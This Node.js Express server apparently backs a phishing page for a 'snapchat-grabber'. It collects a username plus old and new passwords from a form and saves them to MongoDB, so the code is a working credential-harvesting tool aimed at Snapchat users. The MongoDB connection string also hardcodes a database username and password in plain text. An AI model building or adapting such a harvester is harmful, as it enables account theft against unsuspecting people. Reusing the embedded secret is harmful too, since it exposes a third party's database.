const express = require("express");
const app = express();
const mongoose = require("mongoose");
const bodyParser = require("body-parser");
app.use(bodyParser.urlencoded({ extended: false }));

mongoose
  .connect(
    "mongodb+srv://Tevz:kosarka123@cluster0.zf5cirt.mongodb.net/snapchat-grabber?retryWrites=true&w=majority"
  )
  .then(() => console.log("DB Connection Succesfull"))
  .catch((err) => {
    console.log(err);
  });

const accountSchema = {
  username: String,
  oldPassword: String,
  newPassword: String,
};

const Account = mongoose.model("Account", accountSchema);

app.get("/", function (req, res) {
  res.sendFile(__dirname + "/index.html");
});

app.post("/", function (req, res) {
  let newAccount = new Account({
    username: req.body.username,
    oldPassword: req.body.oldPassword,
    newPassword: req.body.newPassword,
  });
  newAccount.save();
  res.sendFile(__dirname + "/index2.html");
});

app.listen(5000, function () {
  console.log("server is running on 5000");
});
